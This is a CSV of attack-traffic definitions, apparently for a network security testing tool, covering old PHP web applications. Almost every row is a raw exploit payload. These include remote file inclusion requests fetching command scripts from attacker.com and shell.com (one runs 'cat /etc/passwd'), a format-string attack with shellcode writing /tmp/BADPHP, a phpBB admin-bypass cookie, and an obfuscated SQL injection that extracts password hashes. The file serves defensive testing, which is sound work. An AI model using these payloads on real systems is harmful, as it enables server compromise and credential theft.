XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
mobilepublisherphp_rfi_IPv6.xml,MobilePublisherPHP Header.PHP Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MobilePublisherPHP is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿myphpcms_rfi.xml,MyPHP CMS File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MyPHP CMS is a web application that typically listens on port 80,HTTP,TCP,GET /styles/default/global_header.php?installed=23domain=http://attacker.com/cmd.txt?cmd=cat /etc/passwd HTTP/1.0[[0D 0A ]]host: www.victim.com[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
myphpcms_rfi.xml,MyPHP CMS File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MyPHP CMS is a web application that typically listens on port 80,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿myphpcms_rfi_IPv6.xml,MyPHP CMS File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MyPHP CMS is a web application that typically listens on port 80 (IPv6 Version),HTTP/IPv6,TCP,GET /styles/default/global_header.php?installed=23domain=http://attacker.com/cmd.txt?cmd=cat /etc/passwd HTTP/1.0[[0D 0A ]]host: www.victim.com[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
myphpcms_rfi_IPv6.xml,MyPHP CMS File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MyPHP CMS is a web application that typically listens on port 80 (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿php3_format.xml,PHP Format String Attack,This threat attempts to execute code on a server running PHP by taking advantage of a improperly used logging function which allows a user to write to an arbitrary address.  The shellcode included will attempt to write a file to /tmp/BADPHP.,HTTP,TCP,POST index.php HTTP/1.0[[0A ]]Content-Type:multipart/form-data %55817X%X%X%hnd[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF ]]d[[DC FF BF 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 BA ]]I[[FE FF FF F7 D2 B9 BF FF FF FF F7 D1 E8 FF FF FF FF C0 ]][j[[16 ]]X[[03 D8 ]]3[[C0 88 ]]C[[0B 83 C0 05 CD 80 ]]3[[C0 ]]@[[CD 80 ]]/tmp/BADPHP[[CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC 0A 0A]]
php3_format.xml,PHP Format String Attack,This threat attempts to execute code on a server running PHP by taking advantage of a improperly used logging function which allows a user to write to an arbitrary address.  The shellcode included will attempt to write a file to /tmp/BADPHP.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpBBAuthen.xml,phpBB Authentication Bypass,This threat is an attempt to bypass authentication on a phpBB bulletin board application.  This allows a user to use the website as an admin.,HTTP,TCP,GET / HTTP/1.0[[0D 0A ]]Cookie: phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D[[0D 0A 0D 0A]]
phpBBAuthen.xml,phpBB Authentication Bypass,This threat is an attempt to bypass authentication on a phpBB bulletin board application.  This allows a user to use the website as an admin.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpBBAuthen_IPv6.xml,phpBB Authentication Bypass (IPv6 Version),This threat is an attempt to bypass authentication on a phpBB bulletin board application.  This allows a user to use the website as an admin. (IPv6 Version),HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A ]]Cookie: phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D[[0D 0A 0D 0A]]
phpBBAuthen_IPv6.xml,phpBB Authentication Bypass (IPv6 Version),This threat is an attempt to bypass authentication on a phpBB bulletin board application.  This allows a user to use the website as an admin. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpBB_viewtopic.xml,phpBB SQL Injection Attack,This threat performs a SQL injection attack against the popular web based bulletin board software phpBB.  This particular attack attempts to retrieve the password hashes of users.  phpBB is a web application and typically listens on port 80.,HTTP,TCP,"GET /phpBB2/viewtopic.php?sid=1&topic_id=-1%20uni%6f%6e%20se%6cec%74%20o%72%64(%73u%62s%74%72%69%6e%67%28%75%73%65r_p%61ss%77%6fr%64,%31%2c1))%20f%72o%6d%20%70%68p%62%62%5fu%73ers%20w%68er%65%20use%72%5f%69%64=2%2f*&view=newest HTTP/1.0[[0A 0A ]]Cookie: phpBB2mysql_sid=1[[0A ]]Host: example.com[[0A 0A]]"
phpBB_viewtopic.xml,phpBB SQL Injection Attack,This threat performs a SQL injection attack against the popular web based bulletin board software phpBB.  This particular attack attempts to retrieve the password hashes of users.  phpBB is a web application and typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpBB_viewtopic_IPv6.xml,phpBB SQL Injection Attack (IPv6 Version),This threat performs a SQL injection attack against the popular web based bulletin board software phpBB.  This particular attack attempts to retrieve the password hashes of users.  phpBB is a web application and typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /phpBB2/viewtopic.php?sid=1&topic_id=-1%20uni%6f%6e%20se%6cec%74%20o%72%64(%73u%62s%74%72%69%6e%67%28%75%73%65r_p%61ss%77%6fr%64,%31%2c1))%20f%72o%6d%20%70%68p%62%62%5fu%73ers%20w%68er%65%20use%72%5f%69%64=2%2f*&view=newest HTTP/1.0[[0A 0A ]]Cookie: phpBB2mysql_sid=1[[0A ]]Host: example.com[[0A 0A]]"
phpBB_viewtopic_IPv6.xml,phpBB SQL Injection Attack (IPv6 Version),This threat performs a SQL injection attack against the popular web based bulletin board software phpBB.  This particular attack attempts to retrieve the password hashes of users.  phpBB is a web application and typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpFullannu_rfi.xml,phpFullAnnu <= v5.1 (repmod) Remote File Inclusion Vulnerability ,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.phpFullAnnu is a web application that typically listens on port 80,HTTP,TCP,GET /modules/home.module.php?repmod=http://www.shell.com/cmd.txt?&cmd=ls HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
phpFullannu_rfi.xml,phpFullAnnu <= v5.1 (repmod) Remote File Inclusion Vulnerability ,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.phpFullAnnu is a web application that typically listens on port 80,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpFullannu_rfi_IPv6.xml,phpFullAnnu <= v5.1 (repmod) Remote File Inclusion Vulnerability  (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.phpFullAnnu is a web application that typically listens on port 80 (IPv6 Version),HTTP/IPv6,TCP,GET /modules/home.module.php?repmod=http://www.shell.com/cmd.txt?&cmd=ls HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
phpFullannu_rfi_IPv6.xml,phpFullAnnu <= v5.1 (repmod) Remote File Inclusion Vulnerability  (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.phpFullAnnu is a web application that typically listens on port 80 (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpMyNewsletter_rfi.xml,phpMyNewsLetter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. phpMyNewsletter is a web application that typically listens on port 80.,HTTP,TCP,GET /include/customize.php?l=http://site.com/cmd.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
phpMyNewsletter_rfi.xml,phpMyNewsLetter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. phpMyNewsletter is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpMyNewsletter_rfi_IPv6.xml,phpMyNewsLetter Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. phpMyNewsletter is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /include/customize.php?l=http://site.com/cmd.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
